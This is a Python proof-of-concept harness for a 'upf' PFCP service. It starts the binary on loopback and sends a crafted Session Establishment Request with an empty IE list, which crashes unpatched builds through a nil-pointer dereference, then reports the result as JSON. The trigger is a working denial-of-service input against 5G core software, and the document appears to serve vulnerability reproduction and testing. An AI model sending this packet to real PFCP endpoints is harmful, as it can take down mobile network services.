#!/usr/bin/env python3
"""PoC driver for the `upf` network service.

Starts the target binary with a dynamically generated JSON configuration,
sends a crafted PFCP session-establishment request over local loopback, and
reports exactly what it observes (abnormal termination or normal completion)
as a single structured JSON object.

The trigger input is a minimal Session Establishment Request whose IE list is
empty: the service's handler dereferences the (absent) Node ID IE, so an
unpatched build panics with a nil pointer dereference.  Other builds may
tolerate the input and keep running; that is a complete, valid outcome too,
and is reported as such.
"""

import argparse
import json
import os
import signal
import socket
import struct
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------------------
# Fixed interface facts about the target service.
# ---------------------------------------------------------------------------
LISTEN_HOST = "127.0.0.1"
LISTEN_PORT = 8805

# The JSON configuration the service needs in order to reach its PFCP listen
# loop.  `http_port` is a string here because the service parses it as such.
CONFIG = {
    "mode": "af_packet",
    "access": {"ifname": "lo"},
    "core": {"ifname": "lo"},
    "cpiface": {"hostname": "", "http_port": "0", "dnn": "internet"},
    "n4_addr": LISTEN_HOST,
    "resp_timeout": "2s",
    "read_timeout": 15,
    "log_level": "info",
}


# ---------------------------------------------------------------------------
# PFCP (Packet Forwarding Control Protocol, 3GPP TS 29.244) packet helpers.
# ---------------------------------------------------------------------------
def _pfcp(msg_type, seq, body=b"", seid=None):
    """Build a PFCP packet.

    Header (non-SEID form, 8 bytes): version=1, S=0, length (16-bit, includes
    the header bytes and the trailing spare/sequence bytes), then a 3-byte
    big-endian sequence number followed by one spare byte.

    Session messages additionally carry an 8-byte SEID between the header and
    the sequence number, so the total header grows to 16 bytes.
    """
    version = 1
    has_seid = seid is not None
    flags = (version << 5) | (1 if has_seid else 0)

    if has_seid:
        length = 16 + len(body)
        header = struct.pack(">BBHQ", flags, msg_type, length, seid)
    else:
        length = 8 + len(body)
        header = struct.pack(">BBH", flags, msg_type, length)

    # 3-byte big-endian sequence number followed by 1 spare byte.
    header += struct.pack(">I", seq)[1:] + b"\x00"
    return header + body


# Message types (3GPP TS 29.244 table 7.1-1).
MSG_HEARTBEAT_REQUEST = 1
MSG_SESSION_ESTABLISHMENT_REQUEST = 50


def build_heartbeat_request(seq):
    """A well-formed, empty-body PFCP Heartbeat Request."""
    return _pfcp(MSG_HEARTBEAT_REQUEST, seq)


def build_trigger(seq):
    """Build the probe input dynamically.

    This is a Session Establishment Request (message type 50) with an SEID of 1
    and an *empty* IE list.  The service's handler resolves the Node ID IE
    without checking for its presence, so this input exercises a nil-pointer
    dereference on unpatched builds.  The exact bytes are derived from the
    protocol constants above rather than read from any prebuilt payload.
    """
    return _pfcp(MSG_SESSION_ESTABLISHMENT_REQUEST, seq, body=b"", seid=1)


# ---------------------------------------------------------------------------
# Process management helpers.
# ---------------------------------------------------------------------------
def _signal_name(signum):
    try:
        return signal.Signals(signum).name
    except (ValueError, AttributeError):
        return None


def _terminate(proc, grace=0.5):
    """Stop the process we started, returning (returncode, signal_name)."""
    if proc.poll() is not None:
        return proc.returncode, None

    try:
        proc.terminate()
    except OSError:
        pass
    try:
        proc.wait(timeout=grace)
    except subprocess.TimeoutExpired:
        try:
            proc.kill()
        except OSError:
            pass
        try:
            proc.wait(timeout=grace)
        except subprocess.TimeoutExpired:
            pass

    if proc.poll() is not None:
        rc = proc.returncode
        return rc, (_signal_name(-rc) if rc is not None and rc < 0 else None)
    return None, None


_CRASH_SIGNALS = ("SIGSEGV", "SIGABRT", "SIGBUS", "SIGILL", "SIGFPE", "SIGSYS", "SIGTRAP")


def _trace_signal(text):
    """Extract the crash signal named in a Go panic/abort trace, if any."""
    for sig in _CRASH_SIGNALS:
        if sig in text:
            return sig
    return None


def _looks_like_crash(text):
    return (
        "panic:" in text
        or "fatal error:" in text
        or "runtime error:" in text
        or _trace_signal(text) is not None
    )


# ---------------------------------------------------------------------------
# Main flow.
# ---------------------------------------------------------------------------
def run(binary, timeout_s):
    start = time.monotonic()
    timed_out = False
    returncode = None
    signal_name = None
    stdout_text = ""
    stderr_text = ""
    observable = None
    error = None
    proc = None
    tmpdir = None
    command = [binary, "-config", ""]

    try:
        # 1. Generate the startup configuration under a temporary directory.
        tmpdir = tempfile.mkdtemp(prefix="upf-poc-")
        config_path = os.path.join(tmpdir, "upf.jsonc")
        with open(config_path, "w", encoding="utf-8") as fh:
            json.dump(CONFIG, fh, indent=2)

        # 2. Start the target.
        command = [binary, "-config", config_path]
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )

        # 3. Wait until the service is listening on loopback UDP.  A bind()
        #    to the same address succeeds only while the port is free, so an
        #    OSError means our target has grabbed it and is up.
        deadline = time.monotonic() + min(timeout_s, 10.0)
        ready = False
        while time.monotonic() < deadline:
            if proc.poll() is not None:
                break
            probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                probe.bind((LISTEN_HOST, LISTEN_PORT))
            except OSError:
                ready = True
            finally:
                probe.close()
            if ready:
                break
            time.sleep(0.05)

        if proc.poll() is not None:
            raise RuntimeError("target exited before the PFCP listener became ready")
        if not ready:
            raise RuntimeError("PFCP listener never became ready")

        # 4. Probe the service.  First a Heartbeat Request (a valid message)
        #    to prove the transcript path works; then the crafted trigger.
        reply_hex = "no_response"
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.settimeout(min(1.0, max(0.2, timeout_s)))
            try:
                sock.sendto(build_heartbeat_request(1), (LISTEN_HOST, LISTEN_PORT))
                data, _addr = sock.recvfrom(4096)
                if data:
                    reply_hex = data.hex()
            except (socket.timeout, OSError):
                reply_hex = "no_response"

            try:
                sock.sendto(build_trigger(2), (LISTEN_HOST, LISTEN_PORT))
            except OSError as exc:
                raise RuntimeError("failed to send trigger: %s" % exc)
        finally:
            sock.close()

        # 5. Observe until the process exits or the window elapses.
        observed_end = start + timeout_s
        while True:
            if proc.poll() is not None:
                break
            if time.monotonic() >= observed_end:
                timed_out = True
                break
            time.sleep(0.02)

        # 6. Make sure the process is gone before reading its output.
        if proc.poll() is None:
            returncode, _ = _terminate(proc)
            # We terminated it ourselves; this is not a crash signal.
            signal_name = None
        else:
            returncode = proc.returncode
            signal_name = (
                _signal_name(-returncode) if returncode is not None and returncode < 0 else None
            )

        stdout_text, stderr_text = proc.communicate()
        stdout_text = stdout_text.decode("utf-8", "replace")
        stderr_text = stderr_text.decode("utf-8", "replace")

        # 7. Decide what we actually observed.
        if not timed_out and _looks_like_crash(stderr_text + stdout_text):
            # Go panics print e.g. "[signal SIGSEGV: ...]" but then exit with
            # code 2 rather than via the OS signal, so surface the crash signal
            # from the trace itself.
            trace_sig = _trace_signal(stderr_text + stdout_text)
            if trace_sig is not None:
                signal_name = trace_sig
            observable = {
                "kind": "crash_trace",
                "value": (stderr_text + stdout_text).strip(),
                "path": None,
            }
        else:
            observable = {
                "kind": "protocol_transcript",
                "value": reply_hex,
                "path": None,
            }

    except Exception as exc:  # noqa: BLE001 - report as a genuine run failure
        error = str(exc)
        if proc is not None:
            if proc.poll() is None:
                returncode, signal_name = _terminate(proc)
            else:
                returncode = proc.returncode
                signal_name = (
                    _signal_name(-returncode)
                    if returncode is not None and returncode < 0
                    else None
                )

    finally:
        # Always make sure the target we started is gone, then clean temp files.
        if proc is not None and proc.poll() is None:
            _terminate(proc)
        if tmpdir is not None:
            try:
                for name in os.listdir(tmpdir):
                    os.unlink(os.path.join(tmpdir, name))
                os.rmdir(tmpdir)
            except OSError:
                pass

    runtime_ms = int((time.monotonic() - start) * 1000)

    return {
        "binary": binary,
        "command": command,
        "returncode": returncode,
        "signal": signal_name,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout_text,
        "stderr": stderr_text,
        "observable": observable,
        "error": error,
    }


def main(argv=None):
    parser = argparse.ArgumentParser(description="PoC driver for the upf service")
    parser.add_argument("--binary", required=True, help="path to the target binary")
    parser.add_argument("--json-out", default=None, help="write JSON result to this file")
    parser.add_argument("--timeout", type=float, default=10.0, help="observation window in seconds")
    args = parser.parse_args(argv)

    result = run(args.binary, args.timeout)

    text = json.dumps(result, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(text)
            fh.write("\n")
    else:
        sys.stdout.write(text)
        sys.stdout.write("\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
